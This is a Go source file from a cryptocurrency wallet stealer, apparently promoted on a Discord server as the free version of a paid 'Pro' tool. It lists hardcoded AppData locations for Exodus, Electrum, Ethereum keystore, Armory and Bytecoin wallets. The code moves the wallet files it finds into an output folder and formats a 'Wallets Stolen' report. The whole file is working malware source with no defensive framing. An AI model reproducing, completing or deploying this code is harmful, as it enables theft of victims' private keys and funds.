// DO NOT EDIT THIS FILE!

// This program is a simplified version with lesser functionality in comparison to the Pro version.
// See the `YHWH Enterprises` Discord for further information: https://discord.gg/GMPfKuR3Tn

package main

import (
	"bytes"
	"fmt"
	"os"
	"strconv"
	"strings"
)

type WalletPath struct {
	Name      string
	Location  string
	Query     string
	Exists    bool
	Extracted bool
	FilesExtracted []File
}

type Wallets struct {
	Paths []WalletPath
}

func FormatWalletsStolen(paths []WalletPath) string {
	// Format the available wallet paths for embed
	if CountExtracted(paths) == 0 {
		return "No Wallets Stolen"
	}

	// Create a buffer to store the formatted output
	var buffer bytes.Buffer

	// Write the header
	buffer.WriteString(fmt.Sprintf("%-10s %-10s %-10s %-10s\n", "Wallet", "Exists", "Stolen", "Files"))
	buffer.WriteString(fmt.Sprintf("%-10s %-10s %-10s %-10s\n", "------", "------", "------", "-----"))

	// Iterate through each path and write its attributes to the table
	for _, path := range paths {
		var filesExtractedStr = "None"
		if len(path.FilesExtracted) > 0 {
			filesExtractedStr = fmt.Sprint(len(path.FilesExtracted))
		}

		buffer.WriteString(fmt.Sprintf("%-10s %-10s %-10s %-10s\n",
			path.Name,
			strconv.FormatBool(path.Exists),
			strconv.FormatBool(path.Extracted),
			filesExtractedStr))
	}

	return buffer.String()
}

func CountExtracted(paths []WalletPath) (count int) {
	// Return a count of the number of extracted wallet paths using a simple iterator
	for _, path := range paths {
		if path.Extracted {
			count += 1
		}
	}

	return count
}

func (stealer *Stealer) GetWallets() {
	// Get all available and useful wallet files from each popular CryptoCurrency Wallet
	paths := walletPaths

	for i, path := range paths {
		// If the path exists, copy all of its useful files into the Output directory
		walletFiles := GetFiles(path.Location)

		if len(walletFiles) != 0 {
			paths[i].Exists = true
			paths[i].FilesExtracted = make([]File, len(walletFiles))

			var walletPath = outputPath + "\\" + path.Name
			if os.Mkdir(walletPath, 0666) != nil {
				continue
			}

			for _, file := range walletFiles {
				if len(path.Query) > 0 && !strings.Contains(file.Name, path.Query) {
					// not developed yet (Bytecoin / Armory section)
					continue
				}

				filePath := walletPath + "\\" + file.Name
				if file.Move(filePath) {
					paths[i].FilesExtracted = append(paths[i].FilesExtracted, file)
				}
			}

			if len(paths[i].FilesExtracted) > 0 {
				paths[i].Extracted = true
			}
		}
	}

	stealer.Apps.Wallets.Paths = paths
}

var walletPaths = []WalletPath{
	{
		Name:     "Exodus",
		Location: "\\AppData\\Roaming\\Exodus\\exodus.wallet\\",
	},
	{
		Name:     "Electrum",
		Location: "\\AppData\\Roaming\\Electrum\\wallets\\",
	},
	{
		Name:     "Ethereum",
		Location: "\\AppData\\Roaming\\Ethereum\\keystore\\",
	},
	{
		Name:     "Armory",
		Location: "\\AppData\\Roaming\\Armory\\",
		Query:    "wallet",
	},
	{
		Name:     "Bytecoin",
		Location: "\\AppData\\Roaming\\bytecoin\\",
		Query:    "wallet",
	},
}